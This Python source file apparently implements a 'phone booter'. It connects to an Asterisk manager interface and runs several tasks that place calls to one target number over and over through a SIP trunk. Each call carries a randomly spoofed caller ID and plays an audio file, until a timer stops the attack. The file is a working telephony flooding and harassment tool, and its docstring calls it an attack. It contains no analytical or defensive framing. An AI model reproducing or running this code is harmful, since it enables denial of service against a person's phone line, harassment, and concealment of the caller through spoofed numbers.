import asyncio
from panoramisk.call_manager import CallManager
from libs.generaterandoms import GenerateRandoms


class PhoneBooter(object):

    def __init__(self, targetNum, numThreads, bootLength, wav):

        self.start(targetNum, numThreads, bootLength, wav)

    @asyncio.coroutine
    def originate(self, targetNum, wav):

        callmanager = CallManager(host='127.0.0.1',
                                  port=5038,
                                  ssl=False,
                                  encoding='utf8')

        yield from callmanager.connect()

        auth = yield from callmanager.send_action({'Action': 'login',
                                                   'Username': 'test',
                                                   'Secret': 'password'})

        # if successful, auth.response returns "Success"
        if auth.response != 'Success':
            print("Failed to login!")
            return

        while True:
            random_number = GenerateRandoms('en_US').phone_number()
            print("Calling with number: %s" % random_number)

            call = yield from callmanager.send_originate({
                'Action': 'Originate',
                'Channel': 'SIP/flowroute/{num}'.format(num=targetNum),
                'WaitTime': 20,
                'CallerID': '{idnum}'.format(idnum=random_number),
                'Application': 'Playback',
                'Data': '{wav}'.format(wav=wav),
                'Async': True
            })


    async def stop_after(self, loop, when):
        await asyncio.sleep(when)
        loop.stop()


    def start(self, targetNum, numThreads, bootLength, wav):
        """Run an attack for the specified number of seconds against the target."""
        loop = asyncio.get_event_loop()
        for x in list(range(numThreads)):
            loop.create_task(self.originate(targetNum, wav))

        loop.create_task(self.stop_after(loop, bootLength))

        # loop.run_until_complete(originate(targetNum))
        loop.run_forever()
        loop.close()
